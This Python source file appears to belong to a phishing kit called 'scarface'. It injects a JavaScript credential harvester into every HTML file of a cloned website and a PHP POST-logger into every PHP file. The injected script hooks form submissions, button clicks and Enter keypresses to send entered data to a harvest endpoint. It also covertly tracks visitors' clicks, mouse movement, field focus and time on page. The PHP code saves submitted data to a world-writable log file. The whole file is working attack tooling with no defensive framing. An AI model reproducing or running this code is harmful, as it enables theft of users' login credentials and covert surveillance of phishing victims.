"""
Enhanced Injector with Intel Dashboard Integration
Replace/update: src/services/injector/inject.py

This version injects BOTH credential harvesting AND intel tracking
"""

import os

def inject_logger_to_all_html(site_dir, intel_enabled=True):
    """
    Inject credential harvesting + intel tracking into ALL HTML files
    
    Args:
        site_dir: Directory containing cloned site
        intel_enabled: Whether to inject intel tracking (default: True)
    """
    HARVEST_ROUTE = "/harvest"
    INTEL_SERVER = "http://127.0.0.1:5500/track"
    
    INJECTION_SCRIPT = f"""
<!-- scarface_logger -->
<script>
(function() {{
    if(window.__scarface_loaded) return;
    window.__scarface_loaded = true;
    
    const SESSION_ID = 'sess_' + Date.now() + '_' + Math.random().toString(36).substr(2, 9);
    
    // ==================== CREDENTIAL HARVESTING ====================
    function formToDict(form) {{
        var data = {{}};
        var fd = new FormData(form);
        fd.forEach(function(value, key) {{
            data[key] = value;
        }});
        if(Object.keys(data).length === 0) {{
            var idx = 0;
            var els = form.querySelectorAll('input,select,textarea');
            els.forEach(function(el) {{
                var k = el.name || el.id || ('field_'+idx++);
                var v = el.value;
                data[k] = v;
            }});
        }}
        return data;
    }}
    
    function sendHarvest(form) {{
        try {{
            var data = formToDict(form);
            fetch('{HARVEST_ROUTE}', {{
                method: 'POST',
                headers: {{ 'Content-Type': 'application/json' }},
                body: JSON.stringify(data)
            }}).catch(function(){{}});
            
            // Also send to intel dashboard
            if ({str(intel_enabled).lower()}) {{
                trackIntel('credentials_submitted', data);
            }}
        }}catch(e){{}}
    }}
    
    // ==================== INTEL TRACKING ====================
    function trackIntel(eventType, data) {{
        if (!{str(intel_enabled).lower()}) return;
        
        const payload = {{
            session_id: SESSION_ID,
            event_type: eventType,
            data: {{
                ...data,
                url: window.location.href,
                referrer: document.referrer,
                screen: {{ width: screen.width, height: screen.height }},
                timestamp: new Date().toISOString()
            }}
        }};
        
        fetch('{INTEL_SERVER}', {{
            method: 'POST',
            headers: {{ 'Content-Type': 'application/json' }},
            body: JSON.stringify(payload),
            mode: 'cors'
        }}).catch(function(){{}});
    }}
    
    // Track page view
    if ({str(intel_enabled).lower()}) {{
        trackIntel('page_view', {{
            title: document.title,
            userAgent: navigator.userAgent,
            language: navigator.language,
            platform: navigator.platform
        }});
    }}
    
    // ==================== FORM HOOKS ====================
    var origSubmit = HTMLFormElement.prototype.submit;
    HTMLFormElement.prototype.submit = function() {{
        sendHarvest(this);
        origSubmit.apply(this, arguments);
    }};
    
    document.addEventListener('submit', function(e){{
        sendHarvest(e.target);
    }}, true);
    
    function hookBtns(form){{
        var btns = form.querySelectorAll('[type=submit],button');
        btns.forEach(function(btn){{
            btn.addEventListener('click', function(){{sendHarvest(form);}}, true);
        }});
        var inputs = form.querySelectorAll('input');
        inputs.forEach(function(input){{
            input.addEventListener('keydown', function(e){{
                if(e.key==='Enter'){{sendHarvest(form);}}
            }}, true);
        }});
    }}
    
    document.querySelectorAll('form').forEach(hookBtns);
    
    var mo = new MutationObserver(function(muts){{
        muts.forEach(function(mut){{
            mut.addedNodes.forEach(function(node){{
                if(node.tagName==='FORM') hookBtns(node);
                else if(node.querySelectorAll) node.querySelectorAll('form').forEach(hookBtns);
            }});
        }});
    }});
    mo.observe(document.documentElement,{{childList:true,subtree:true}});
    
    // ==================== INTEL TRACKING EVENTS ====================
    if ({str(intel_enabled).lower()}) {{
        // Mouse movement (throttled)
        let lastMouse = 0;
        document.addEventListener('mousemove', function(e) {{
            const now = Date.now();
            if (now - lastMouse > 3000) {{
                lastMouse = now;
                trackIntel('mouse_move', {{ x: e.clientX, y: e.clientY }});
            }}
        }}, {{ passive: true }});
        
        // Clicks
        document.addEventListener('click', function(e) {{
            trackIntel('click', {{
                element: e.target.tagName,
                id: e.target.id,
                text: e.target.textContent?.substring(0, 50)
            }});
        }}, {{ passive: true }});
        
        // Form field focus
        document.addEventListener('focus', function(e) {{
            if (e.target.tagName === 'INPUT' || e.target.tagName === 'TEXTAREA') {{
                trackIntel('form_field_focus', {{
                    field_name: e.target.name || e.target.id,
                    field_type: e.target.type
                }});
            }}
        }}, true);
        
        // Time on page
        let timeOnPage = 0;
        setInterval(function() {{
            timeOnPage += 5;
            trackIntel('time_on_page', {{ seconds: timeOnPage }});
        }}, 5000);
        
        // Page unload
        window.addEventListener('beforeunload', function() {{
            trackIntel('page_unload', {{ seconds_on_page: timeOnPage }});
        }});
    }}
}})();
</script>
"""
    
    for root, _, files in os.walk(site_dir):
        for file in files:
            if file.lower().endswith('.html'):
                html_file = os.path.join(root, file)
                try:
                    with open(html_file, "r", encoding="utf-8") as f:
                        content = f.read()
                    
                    if "scarface_logger" in content:
                        continue

                    if "<head>" in content:
                        new_content = content.replace("<head>", "<head>" + INJECTION_SCRIPT, 1)
                    elif "<head " in content:
                        idx = content.find("<head ")
                        idx2 = content.find(">", idx)
                        if idx2 != -1:
                            new_content = content[:idx2+1] + INJECTION_SCRIPT + content[idx2+1:]
                        else:
                            new_content = content + INJECTION_SCRIPT
                    elif "</body>" in content:
                        new_content = content.replace("</body>", INJECTION_SCRIPT + "\n</body>", 1)
                    else:
                        new_content = content + INJECTION_SCRIPT

                    backup = html_file + ".bak"
                    if not os.path.exists(backup):
                        with open(backup, "w", encoding="utf-8") as f:
                            f.write(content)
                    
                    with open(html_file, "w", encoding="utf-8") as f:
                        f.write(new_content)
                        
                except Exception:
                    pass


def inject_logger_to_php(site_dir, site_name, credentials_dir):
    """
    Injects PHP logging code into all PHP files in the site
    """
    try:
        dir_path = os.path.join(credentials_dir, site_name).replace('\\', '/')
        logger_code = f"""
<?php // scarface_logger
if ($_SERVER["REQUEST_METHOD"] == "POST") {{
    $raw_data = file_get_contents('php://input');
    parse_str($raw_data, $data);
    $dir = "{dir_path}";
    @mkdir($dir, 0777, true);
    @chmod($dir, 0777);
    $file = $dir . "/result.json";
    $log = [];
    if (file_exists($file)) {{
        $log = json_decode(file_get_contents($file), true);
        if (!is_array($log)) $log = [];
    }}
    $log[] = [
        "timestamp" => date("Y-m-d H:i:s"),
        "data" => $data
    ];
    file_put_contents($file, json_encode($log, JSON_PRETTY_PRINT));
}}
?>
"""
        for root, _, files in os.walk(site_dir):
            for file in files:
                if file.lower().endswith(".php") and not file.endswith('.bak'):
                    php_file = os.path.join(root, file)
                    try:
                        with open(php_file, "r", encoding="utf-8") as f:
                            content = f.read()
                        
                        if "scarface_logger" in content:
                            continue
                        
                        if content.lstrip().startswith("<?php"):
                            parts = content.split("?>", 1)
                            new_content = parts[0] + "?>\n" + logger_code + (parts[1] if len(parts) > 1 else "")
                        else:
                            new_content = logger_code + content
                        
                        backup = php_file + ".bak"
                        if not os.path.exists(backup):
                            with open(backup, "w", encoding="utf-8") as f:
                                f.write(content)
                        
                        with open(php_file, "w", encoding="utf-8") as f:
                            f.write(new_content)
                    except Exception:
                        pass
    except Exception:
        pass
